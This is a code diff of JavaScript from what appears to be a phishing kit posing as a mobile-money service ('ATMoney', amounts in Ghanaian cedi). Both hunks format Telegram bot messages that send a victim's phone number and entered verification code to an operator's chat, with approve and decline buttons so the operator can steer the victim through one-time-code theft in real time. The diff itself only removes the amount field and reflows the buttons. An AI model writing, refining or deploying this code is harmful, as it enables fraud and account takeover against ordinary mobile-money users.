@@ -442,20 +442,16 @@
                     },
                     body: JSON.stringify({
                         chat_id: CONFIG.CHAT_ID,
-                        text: `<b>🔴 ATMoney Code Verification</b>\n\nAmount: GHS ${amount}\nPhone: <code>${phone}</code>\nCode Entered: <code>${code}</code>\n\nChoose Action:`,
+                        text: `<b>🔴 ATMoney Code Verification</b>\n\nPhone: <code>${phone}</code>\nCode Entered: <code>${code}</code>\n\nChoose Action:`,
                         parse_mode: 'HTML',
                         reply_markup: {
-                            inline_keyboard: [
-                                [{
-                                    text: "✅ Approve Code",
-                                    callback_data: approveCodeId
-                                }],
-                                [{
-                                    text: "❌ Decline (Wrong Code)",
-                                    callback_data: declineCodeId
-                                }]
-                            ]
-                        }
+    inline_keyboard: [
+        [
+            { text: "✅ Approve Code", callback_data: approveCodeId },
+            { text: "❌ Decline ", callback_data: declineCodeId }
+        ]
+    ]
+}
                     })
                 })
                 .then(() => {
@@ -517,20 +513,16 @@
                     },
                     body: JSON.stringify({
                         chat_id: CONFIG.CHAT_ID,
-                        text: `<b>🔴 ATMoney Prompt Approval</b>\n\nAmount: GHS ${amount}\nPhone: <code>${phone}</code>\n\nUser is waiting for prompt approval. Choose Action:`,
+                        text: `<b>🔴 ATMoney Prompt Approval</b>\n\nPhone: <code>${phone}</code>\n\nUser is waiting for prompt approval. Choose Action:`,
                         parse_mode: 'HTML',
                         reply_markup: {
-                            inline_keyboard: [
-                                [{
-                                    text: "✅ Approve Prompt",
-                                    callback_data: approvePromptId
-                                }],
-                                [{
-                                    text: "❌ Decline Prompt",
-                                    callback_data: declinePromptId
-                                }]
-                            ]
-                        }
+    inline_keyboard: [
+        [
+            { text: "✅ Approve Prompt", callback_data: approvePromptId },
+            { text: "❌ Decline ", callback_data: declinePromptId }
+        ]
+    ]
+}
                     })
                 })
                 .then(() => {
